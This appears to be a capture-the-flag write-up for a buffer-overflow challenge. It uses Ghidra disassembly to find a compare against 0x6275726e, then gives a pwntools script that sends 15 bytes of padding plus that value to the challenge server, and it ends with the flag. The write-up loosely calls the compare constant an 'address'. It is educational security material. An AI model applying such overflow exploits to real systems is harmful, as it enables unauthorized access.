# Classic Buffer-overflow


**The challenge was to overflow the input buffer and pass a compare.**


opening up the binary in ghidra and looking at the functions section
we can see that we have a main function.

Looking at the disassembly for main we first see all 
the local variables being set and then some strings being printed.

![Disassembly](https://github.com/ZeroCooL-555/CTF/blob/master/10an/pwn/crash-override/1.png)

Looking further we get a very interesting disassembly

```asm
0001139a 81 7d f4  CMP  dword ptr [EBP + -0xc]=>local_14,0x6275726e
000113a1 75 07     JNZ  LAB_000113aa
000113a3 e8 c5 fe  CALL access_granted
         ff ff
```

if `local_14` is equal to `0x6275726e`
we will jump to `access_granted` and if not we jump to `LAB_000113aa`
which just throws at us "Not authenticated" and our row number.

![LAB Disassembly](https://github.com/ZeroCooL-555/CTF/blob/master/10an/pwn/crash-override/2.png)


## The attack plan

So with all this information we can start to build out our exploit

first we know that we have control over `local_14` because that's the input we provide. Overflowing the buffer by sending in 15 A's then passing in the address given in the disassembly should give us a shell.

```python
#!/usr/bin/python3

from pwn import *

padding = b"A"*15
payload = padding + p32(0x6275726e)

r = remote('0xa.is', 31337)
r.recvuntil('Key: ')
r.sendline(payload)

print(r.recv().decode('Latin-1'))
r.interactive()
```


#### Flag: 10an{r4bb1t_flu5h0t_50m30n3_t4lk_t0_m3}

